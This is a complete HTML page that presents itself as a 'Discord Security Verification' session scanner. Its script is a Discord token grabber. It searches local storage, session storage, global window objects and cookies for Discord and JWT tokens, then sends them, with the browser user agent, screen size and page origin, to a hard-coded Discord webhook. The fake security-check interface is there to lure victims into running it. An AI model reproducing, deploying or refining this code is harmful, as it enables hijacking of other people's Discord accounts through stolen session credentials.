<!DOCTYPE html>
<html>
<head>
    <title>Discord Session Check</title>
    <style>
    body{margin:0;padding:40px;background:#36393f;color:#dcddde;font-family:Arial;text-align:center}
    .box{max-width:450px;margin:auto;background:#2f3136;padding:30px;border-radius:8px;box-shadow:0 8px 30px rgba(0,0,0,.6)}
    button{background:#5865f2;color:white;border:0;padding:15px 30px;border-radius:5px;font-size:16px;cursor:pointer;font-weight:bold}
    button:hover{background:#4f55d4}
    #spin{display:none;border:3px solid #5865f2;border-top-color:transparent;border-radius:50%;width:25px;height:25px;margin:15px auto;animation:r 1s linear infinite}
    @keyframes r{to{transform:rotate(360deg)}}
    #log{background:#1e1f22;padding:15px;border-radius:5px;margin-top:20px;font-size:14px;text-align:left;max-height:400px;overflow:auto;white-space:pre-wrap}
    .success{color:#43b581}.error{color:#f04747}.info{color:#7289da}
    </style>
</head>
<body>
<div class="box">
    <h2>üîí Discord Security Verification</h2>
    <p>Please wait while we verify your session...</p>
    <button id="btn">üîç Scan Discord Tokens</button>
    <div id="spin"></div>
    <div id="status">Ready to scan</div>
    <div id="log"></div>
</div>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1458805262717554860/3tbcU7WYe5patEKfvuF0WcgptMotAhK2k7vY9_e9kwOIU8u3zzNgU71ZkXKGcY7FNh32';

function log(msg, type='info') {
    const logDiv = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    logDiv.innerHTML += `<span class="${type}">[${time}] ${msg}\n</span>`;
    logDiv.scrollTop = logDiv.scrollHeight;
    console.log(`[${type.toUpperCase()}] ${msg}`);
}

log('üöÄ ADVANCED Token Grabber LOADED - Open Discord.com/app first, then click Scan');
document.getElementById('btn').onclick = runGrabber;

async function runGrabber() {
    log('üéØ STARTING ADVANCED TOKEN HUNT...');
    document.getElementById('btn').style.display = 'none';
    document.getElementById('spin').style.display = 'block';
    document.getElementById('status').textContent = 'Deep scanning all storage...';
    
    const results = await huntTokens();
    
    document.getElementById('spin').style.display = 'none';
    document.getElementById('status').innerHTML = `<a href="https://discord.com/app" style="color:#43b581">‚úÖ Go to Discord</a>`;
    
    if(results.tokens.length > 0) {
        log(`üéâ FOUND ${results.tokens.length} TOKEN(S)! Sending...`, 'success');
        await sendToWebhook(results);
        log('‚úÖ WEBHOOK SUCCESS - Check your Discord!', 'success');
    } else {
        log('‚ùå No tokens found. DEBUG INFO:', 'error');
        log(`üìä LocalStorage: ${results.localStorageCount} items`, 'error');
        log(`üìä SessionStorage: ${results.sessionStorageCount} items`, 'error');
        log(`üîç Discord keys found: ${results.discordKeys.length}`, 'error');
        if(results.discordKeys.length > 0) {
            log(`Keys: ${results.discordKeys.slice(0, 5).join(', ')}${results.discordKeys.length > 5 ? '...' : ''}`, 'error');
        }
        log('üí° Open Discord.com/app ‚Üí Login ‚Üí Come back ‚Üí Scan AGAIN', 'error');
    }
}

async function huntTokens() {
    const tokens = [];
    const discordKeys = [];
    let localStorageCount = 0;
    let sessionStorageCount = 0;
    
    // 1. DISCORD-SPECIFIC DOMAINS & KEYS
    const discordDomains = ['discord.com', 'discordapp.com', '__discord_', 'token'];
    const discordKeysPattern = new RegExp(discordDomains.join('|'), 'i');
    
    // 2. SCAN LOCALSTORAGE (Enhanced)
    log('üìÇ Scanning LocalStorage (${localStorage.length} items)...');
    for(let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if(key) {
            localStorageCount++;
            if(discordKeysPattern.test(key)) {
                discordKeys.push(key);
                const value = localStorage.getItem(key);
                const token = extractToken(value);
                if(token) {
                    tokens.push({source: `LocalStorage.${key.substring(0,30)}`, token});
                    log(`‚úÖ TOKEN: LocalStorage.${key}`, 'success');
                }
            }
        }
    }
    
    // 3. SCAN SESSIONSTORAGE (Enhanced)
    log('üìÇ Scanning SessionStorage (${sessionStorage.length} items)...');
    for(let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if(key) {
            sessionStorageCount++;
            const value = sessionStorage.getItem(key);
            if(discordKeysPattern.test(key)) {
                discordKeys.push(key);
            }
            const token = extractToken(value);
            if(token) {
                tokens.push({source: `SessionStorage.${key?.substring(0,30)||'unknown'}`, token});
                log(`‚úÖ TOKEN: SessionStorage.${key||'raw'}`, 'success');
            }
        }
    }
    
    // 4. GLOBAL STATE SCAN (Discord's __INITIAL_STATE__)
    log('üîç Scanning global objects...');
    try {
        if(window.__INITIAL_STATE__) {
            const stateToken = extractToken(JSON.stringify(window.__INITIAL_STATE__));
            if(stateToken) {
                tokens.push({source: '__INITIAL_STATE__', token: stateToken});
                log('‚úÖ TOKEN: __INITIAL_STATE__', 'success');
            }
        }
        
        // 5. WINDOW OBJECT SCAN
        const windowProps = Object.getOwnPropertyNames(window);
        for(let prop of windowProps) {
            if(prop.includes('discord') || prop.includes('token')) {
                try {
                    const value = window[prop];
                    const token = extractToken(JSON.stringify(value));
                    if(token) {
                        tokens.push({source: `window.${prop}`, token});
                        log(`‚úÖ TOKEN: window.${prop}`, 'success');
                    }
                } catch(e) {}
            }
        }
    } catch(e) {
        log('‚ö†Ô∏è Global scan skipped (CORS)', 'info');
    }
    
    // 6. COOKIES SCAN
    log('üç™ Scanning Cookies...');
    document.cookie.split(';').forEach(cookie => {
        const token = extractToken(cookie);
        if(token) {
            tokens.push({source: 'Cookies', token});
            log('‚úÖ TOKEN: Cookies', 'success');
        }
    });
    
    return {
        tokens, 
        localStorageCount, 
        sessionStorageCount,
        discordKeys
    };
}

function extractToken(text) {
    if(!text) return null;
    const patterns = [
        /mfa\.[\w\-]{84}/g,
        /[\w\-]{24}\.[\w\-]{6}\.[\w\-]{27}/g,
        /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\./g  // JWT tokens
    ];
    for(let pattern of patterns) {
        const match = text.match(pattern);
        if(match && match[0]) return match[0];
    }
    return null;
}

async function sendToWebhook(data) {
    const payload = {
        username: 'üíé Discord Token Grabber v2.0',
        avatar_url: 'https://discord.com/assets/6debd47ed13483642cf09e832ed0bc1b.png',
        embeds: [{
            title: `üéØ ${data.tokens.length} Discord Token(s) Captured`,
            color: 16711680,
            fields: [
                {name: 'üîë Tokens', value: data.tokens.length.toString(), inline: true},
                {name: 'üíæ LocalStorage', value: data.localStorageCount.toString(), inline: true},
                {name: 'üíæ SessionStorage', value: data.sessionStorageCount.toString(), inline: true},
                {name: 'üñ•Ô∏è UA', value: navigator.userAgent.slice(0, 40)+'...', inline: false},
                {name: 'üìè Screen', value: `${screen.width}x${screen.height}`, inline: true},
                {name: 'üåê Origin', value: window.location.origin, inline: true}
            ],
            timestamp: new Date().toISOString()
        }]
    };
    
    const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
    });
    
    if(response.ok) {
        log('‚úÖ Main webhook sent!', 'success');
        
        // Detailed tokens
        let tokenDetails = '';
        data.tokens.forEach((t, i) => {
            tokenDetails += `${i+1}. **${t.source}**\n\`${t.token.slice(0, 30)}...\`\n\n`;
        });
        
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: '**üìã FULL TOKEN LIST:**\n' + tokenDetails,
                username: 'Token Details'
            })
        });
    } else {
        log(`‚ùå Webhook error: ${response.status}`, 'error');
    }
}
</script>
</body>
</html>